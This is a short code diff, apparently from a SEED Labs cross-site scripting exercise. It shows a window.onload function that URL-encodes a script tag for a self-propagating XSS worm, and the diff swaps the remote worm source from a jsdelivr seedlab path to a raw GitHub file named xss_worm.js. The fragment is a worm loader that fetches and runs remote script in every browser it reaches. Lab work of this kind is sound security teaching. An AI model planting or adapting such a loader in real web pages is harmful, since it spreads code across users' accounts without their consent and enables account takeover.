@@ -1,7 +1,7 @@
 window.onload = function () {
     var wormCode = encodeURIComponent(
         '<script type="text/javascript"' +
-        'src="https://cdn.jsdelivr.net/gh/li-xin-yi/seedlab@latest/Cross-Site-Scripting-Attack/xssworm.js">' +
+        'src="https://raw.githubusercontent.com/airanatividad/storage/refs/heads/main/xss_worm.js">' +
         "</" +
         "script>"
     );
